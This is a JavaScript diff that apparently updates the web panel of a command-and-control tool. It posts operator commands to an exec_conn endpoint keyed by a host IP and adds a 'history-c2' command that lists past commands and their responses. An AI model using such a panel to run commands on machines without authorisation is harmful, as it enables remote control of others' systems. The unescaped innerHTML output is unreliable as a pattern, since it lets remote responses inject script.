@@ -1,14 +1,19 @@
-function gethistory(){
-    let ip = document.getElementById('ip').innerHTML
+function gethistory(ip){
     fetch(`http://127.0.0.1:8000/exec_hist?ip=${ip}`)
     .then(response =>{
-        return response.text();
+        return response.json();
     })
     .then(data => {
-        for(i=0; i<data.length(); i++){
-            
+        obj = data;
+        data = '<p>';
+
+        for (const [key,value] of Object.entries(obj)) {
+            data += `<strong>Timestamp:</strong>${key}<br>`;
+            data += `<strong>Command:</strong><br>${value.command}<br>`;
+            data += `<strong>Response:</strong><br>${value.response}<br>`;
+            data += '--------------------------------------------------------------------------------------<br>';
         }
-        document.querySelector('.resp').innerHTML = data;
+        document.getElementById(`response-${ip}`).innerHTML = `${data}</p>`;
     })
 }
 function submitCommand(event, ip) {
@@ -16,7 +21,8 @@ function submitCommand(event, ip) {
     const form = event.target;
     const command = form.querySelector('input[name="command"]').value;
 
-    fetch(form.action, {
+  if(command != "history-c2"){
+    fetch(`http://127.0.0.1:8000/exec_conn/${ip}`, {
       method: 'POST',
       headers: {
         'X-CSRFToken': form.querySelector('input[name="csrfmiddlewaretoken"]').value,
@@ -31,3 +37,8 @@ function submitCommand(event, ip) {
     })
     .catch(error => console.error('Error:', error));
   }
+  else{
+    gethistory(ip);
+  }
+}
+
